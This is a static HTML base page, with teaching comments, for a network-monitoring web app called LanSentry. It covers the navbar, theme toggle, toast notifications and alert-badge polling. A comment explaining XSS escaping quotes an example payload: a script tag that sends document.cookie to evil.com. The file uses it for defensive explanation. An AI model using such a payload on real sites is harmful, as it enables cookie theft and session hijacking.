<!DOCTYPE html>
<!--
  base.html — LanSentry Shell Page
  ══════════════════════════════════════════════════════════════════
  This file is NOT a Jinja2 template. It is pure static HTML.
  Flask serves it as-is with send_from_directory() — no rendering.

  Every page (home, devices, alerts) includes this file's navbar,
  toast system, and theme toggle by copying this structure and adding
  their own <main> content. There is no server-side "extends" anymore.

  All dynamic data (alert badge count, nav highlighting) comes from
  JavaScript fetch() calls AFTER the page loads.
  ══════════════════════════════════════════════════════════════════
-->
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <!--
    viewport meta tag: Essential for responsive design.
    Without it, mobile browsers render the page at desktop width and
    then zoom out — everything becomes tiny and unusable.
    width=device-width: use the device's actual screen width
    initial-scale=1.0:  don't zoom in/out at first load
  -->
  <title>LanSentry</title>
  <link rel="stylesheet" href="/style.css" />
  <!--
    Why /style.css and not style.css?
    Leading slash = absolute path from the site root.
    Without it, "style.css" is relative to the current URL path,
    which would break on /devices or /alerts (looking for /devices/style.css).
  -->
</head>
<body>

  <!-- ══════════════════════════════════════════════════════════
       NAVBAR
       The same navbar appears on every page because every page
       copies this file's structure. No server-side includes needed.
  ══════════════════════════════════════════════════════════════ -->
  <nav class="navbar">

    <!-- Brand -->
    <a class="navbar-brand" href="/">
      <div class="logo-icon">🛡️</div>
      <h1>Lan<span>Sentry</span></h1>
    </a>

    <!-- Desktop nav links -->
    <ul class="nav-links">
      <li><a href="/"        id="nav-home">🏠 Home</a></li>
      <li><a href="/devices" id="nav-devices">📡 Devices</a></li>
      <li>
        <a href="/alerts" id="nav-alerts">
          🚨 Alerts
          <!--
            alert-badge: hidden by default (display:none).
            The updateAlertBadge() function below fetches the unread count
            from /api/alerts/unread-count and shows/hides this badge.
            This is client-side badge rendering — no server involvement.
          -->
          <span class="alert-badge" id="alert-badge" style="display:none">0</span>
        </a>
      </li>
    </ul>

    <!-- Right side controls -->
    <div class="nav-right">
      <div class="network-status">
        <div class="status-dot"></div>
        <span>Network Active</span>
      </div>

      <!--
        Theme toggle button.
        Clicking it calls toggleTheme() which adds/removes the 'light-mode'
        class on <body>. All colour changes happen via CSS custom properties
        (variables) — switching one class re-themes the entire app instantly.
      -->
      <button class="theme-toggle" id="theme-toggle" title="Toggle dark/light mode"
              onclick="toggleTheme()">
        <div class="toggle-knob" id="toggle-knob">🌙</div>
      </button>

      <!-- Hamburger — only visible on mobile (CSS hides on desktop) -->
      <button class="hamburger" id="hamburger" aria-label="Open menu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </nav>

  <!-- Mobile drawer — slides down when hamburger is clicked -->
  <div class="mobile-nav" id="mobile-nav">
    <a href="/">🏠 Home</a>
    <a href="/devices">📡 Devices</a>
    <a href="/alerts">🚨 Alerts</a>
  </div>

  <!-- ══════════════════════════════════════════════════════════
       MAIN CONTENT AREA
       Each page puts its content here (replaces this comment).
  ══════════════════════════════════════════════════════════════ -->
  <div class="container" id="app-content">
    <!-- Page-specific content replaces this in home.html, devices.html, alerts.html -->
  </div>

  <!-- Toast notification container (bottom-right corner) -->
  <div class="toast-container" id="toast-container"></div>

  <!-- ══════════════════════════════════════════════════════════
       GLOBAL JAVASCRIPT
       Runs on every page. Handles:
         • Theme persistence (localStorage)
         • Hamburger menu
         • Active nav link highlighting
         • Toast notification system
         • Alert badge polling
  ══════════════════════════════════════════════════════════════ -->
  <script>
    // ────────────────────────────────────────────────────────
    // THEME TOGGLE
    // ────────────────────────────────────────────────────────
    // We use localStorage to remember the user's preference across page loads.
    // localStorage stores key-value strings that persist until cleared.
    // It's scoped to the origin (domain + port) — not shared between sites.

    function toggleTheme() {
      document.body.classList.toggle("light-mode");
      const isLight = document.body.classList.contains("light-mode");

      // Update the toggle knob emoji
      document.getElementById("toggle-knob").textContent = isLight ? "☀️" : "🌙";

      // Persist the choice in localStorage
      localStorage.setItem("lansentry-theme", isLight ? "light" : "dark");

      // Fire a custom event so chart code can re-render with the new colours.
      // Custom events let decoupled code communicate without direct references.
      document.dispatchEvent(new CustomEvent("themeChanged", { detail: { isLight } }));
    }

    // Restore saved theme on every page load (runs before DOMContentLoaded)
    (function applySavedTheme() {
      const saved = localStorage.getItem("lansentry-theme");
      if (saved === "light") {
        document.body.classList.add("light-mode");
        // Toggle knob updated after DOM loads (see DOMContentLoaded below)
      }
    })();
    // Why an IIFE (Immediately Invoked Function Expression)?
    // It runs immediately but keeps its variables out of the global scope,
    // preventing accidental name collisions with other scripts.


    // ────────────────────────────────────────────────────────
    // HAMBURGER MENU
    // ────────────────────────────────────────────────────────
    function initHamburger() {
      const btn      = document.getElementById("hamburger");
      const mobileNav = document.getElementById("mobile-nav");
      if (!btn) return;

      btn.addEventListener("click", () => {
        mobileNav.classList.toggle("open");
      });

      // Close the drawer when any link inside it is clicked
      mobileNav.querySelectorAll("a").forEach(link => {
        link.addEventListener("click", () => mobileNav.classList.remove("open"));
      });
    }


    // ────────────────────────────────────────────────────────
    // ACTIVE NAV LINK HIGHLIGHTING
    // ────────────────────────────────────────────────────────
    // window.location.pathname gives the URL path, e.g. "/devices".
    // We compare it to the href of each nav link to highlight the active one.
    // This replaces the Jinja `page` variable that was previously passed from Flask.
    function highlightActiveNav() {
      const path = window.location.pathname;

      const map = {
        "/":        "nav-home",
        "/devices": "nav-devices",
        "/alerts":  "nav-alerts",
      };

      // Remove 'active' from all links first (clean state)
      Object.values(map).forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove("active");
      });

      // Add 'active' to the matching link
      const targetId = map[path];
      if (targetId) {
        const el = document.getElementById(targetId);
        if (el) el.classList.add("active");
      }
    }


    // ────────────────────────────────────────────────────────
    // TOAST NOTIFICATION SYSTEM
    // ────────────────────────────────────────────────────────
    // showToast() is available globally so any page script can call it.
    // It creates a <div>, appends it to the toast container, and auto-removes
    // it after `duration` milliseconds.

    function showToast(message, type = "info", duration = 3500) {
      const container = document.getElementById("toast-container");
      const icons     = { success: "✅", error: "❌", info: "ℹ️", warning: "⚠️" };

      const toast = document.createElement("div");
      toast.className = `toast ${type}`;

      // escapeHTML prevents XSS: if `message` contains "<script>", it gets
      // turned into "&lt;script&gt;" and displayed as text, not executed.
      toast.innerHTML = `<span>${icons[type] || "ℹ️"}</span><span>${escapeHTML(message)}</span>`;

      container.appendChild(toast);

      // Auto-remove after duration
      setTimeout(() => {
        toast.style.animation = "toastOut 0.3s ease forwards";
        setTimeout(() => toast.remove(), 300);
      }, duration);
    }


    // ────────────────────────────────────────────────────────
    // XSS PREVENTION UTILITY
    // ────────────────────────────────────────────────────────
    // CRITICAL SECURITY FUNCTION — called before ANY user-supplied data
    // is inserted into innerHTML.
    //
    // XSS (Cross-Site Scripting) attack:
    //   A device on the network has hostname: <script>fetch('evil.com?c='+document.cookie)<\/script>
    //   If we do: td.innerHTML = device.hostname  → the script executes!
    //   If we do: td.innerHTML = escapeHTML(device.hostname) → it displays as text ✓
    //
    // The trick: create a temporary element, use textContent to set the value
    // (textContent never executes HTML), then read innerHTML which has auto-escaped it.

    function escapeHTML(str) {
      if (str === null || str === undefined) return "";
      const el = document.createElement("div");
      el.textContent = String(str);
      return el.innerHTML;
      // e.g. '<script>' → '&lt;script&gt;'
    }


    // ────────────────────────────────────────────────────────
    // ALERT BADGE UPDATER
    // ────────────────────────────────────────────────────────
    // Polls /api/alerts/unread-count every 30 seconds.
    // Shows/hides the red badge on the Alerts nav link.

    function updateAlertBadge() {
      fetch("/api/alerts/unread-count")
        .then(r => r.json())
        .then(data => {
          const badge = document.getElementById("alert-badge");
          if (!badge) return;

          if (data.count > 0) {
            badge.textContent    = data.count;
            badge.style.display  = "inline";
          } else {
            badge.style.display  = "none";
          }
        })
        .catch(() => {});  // Silently ignore network errors for the badge
    }


    // ────────────────────────────────────────────────────────
    // INITIALISATION — runs when DOM is ready
    // ────────────────────────────────────────────────────────
    document.addEventListener("DOMContentLoaded", () => {
      // Apply the saved theme icon (body class already applied above)
      if (document.body.classList.contains("light-mode")) {
        const knob = document.getElementById("toggle-knob");
        if (knob) knob.textContent = "☀️";
      }

      initHamburger();
      highlightActiveNav();
      updateAlertBadge();

      // Poll the badge every 30 seconds
      setInterval(updateAlertBadge, 30000);
    });
  </script>

</body>
</html>
